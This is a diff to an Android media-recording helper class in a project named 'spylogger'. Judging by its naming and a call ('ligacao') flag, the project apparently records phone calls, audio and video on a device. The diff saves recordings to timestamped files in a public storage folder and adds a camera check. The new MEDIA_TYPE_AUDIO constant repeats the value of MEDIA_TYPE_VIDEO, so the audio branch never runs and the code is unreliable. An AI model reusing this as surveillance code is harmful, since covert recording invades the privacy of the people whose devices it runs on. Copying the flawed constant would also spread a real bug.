@@ -1,10 +1,12 @@
 package com.gravatasufoca.spylogger.helpers;
 
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
 import android.media.CamcorderProfile;
 import android.media.MediaRecorder;
+import android.os.Environment;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
@@ -12,6 +14,7 @@ import android.view.WindowManager;
 
 import java.io.File;
 import java.io.IOException;
+import java.text.SimpleDateFormat;
 import java.util.Date;
 
 import lombok.Getter;
@@ -27,6 +30,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, Surfac
 
     public static final int MEDIA_TYPE_IMAGE = 1;
     public static final int MEDIA_TYPE_VIDEO = 2;
+    public static final int MEDIA_TYPE_AUDIO = 2;
 
 
     private Context context;
@@ -56,7 +60,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, Surfac
     }
 
     private void prepareAudio() throws IOException {
-        recordedFile = File.createTempFile("record", ".mp4", context.getCacheDir());
+        recordedFile =  getOutputMediaFile(MEDIA_TYPE_AUDIO); //File.createTempFile("record", ".mp4", context.getCacheDir());
 
         if (ligacao) {
             try {
@@ -119,7 +123,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, Surfac
 
     @SuppressWarnings("deprecation")
     private void prepareVideo() throws IOException {
-        recordedFile = File.createTempFile("record", ".mp4", context.getCacheDir());
+        recordedFile = getOutputMediaFile(MEDIA_TYPE_VIDEO); //File.createTempFile("record", ".mp4", context.getCacheDir());
 
         recorder = new MediaRecorder();
 
@@ -158,7 +162,9 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, Surfac
 
     private void releaseMediaRecorder() {
         if (recorder != null) {
-            recorder.stop();
+            if(isRecording()) {
+                recorder.stop();
+            }
             recorder.reset();   // clear recorder configuration
             recorder.release(); // release the recorder object
             recorder = null;
@@ -210,6 +216,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, Surfac
     @Override
     public void onInfo(MediaRecorder mediaRecorder, int what, int i1) {
         if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
+            recording=false;
             stop();
         }
     }
@@ -262,5 +269,51 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, Surfac
 
     @Override
     public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
+    }
+
+    private boolean checkCameraHardware(Context context) {
+        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
+            // this device has a camera
+            return true;
+        } else {
+            // no camera on this device
+            return false;
+        }
+    }
+
+    private  File getOutputMediaFile(int type){
+        // To be safe, you should check that the SDCard is mounted
+        // using Environment.getExternalStorageState() before doing this.
+
+        File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
+                Environment.DIRECTORY_PICTURES), "MyCameraApp");
+        // This location works best if you want the created images to be shared
+        // between applications and persist after your app has been uninstalled.
+
+        // Create the storage directory if it does not exist
+        if (! mediaStorageDir.exists()){
+            if (! mediaStorageDir.mkdirs()){
+                Log.d("MyCameraApp", "failed to create directory");
+                return null;
+            }
+        }
+
+        // Create a media file name
+        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
+        File mediaFile;
+        if (type == MEDIA_TYPE_IMAGE){
+            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
+                    "IMG_"+ timeStamp + ".jpg");
+        } else if(type == MEDIA_TYPE_VIDEO) {
+            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
+                    "VID_"+ timeStamp + ".mp4");
+        } else if(type == MEDIA_TYPE_AUDIO) {
+            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
+                    "AUD_"+ timeStamp + ".mp4");
+        } else {
+            return null;
+        }
+
+        return mediaFile;
     }
 }
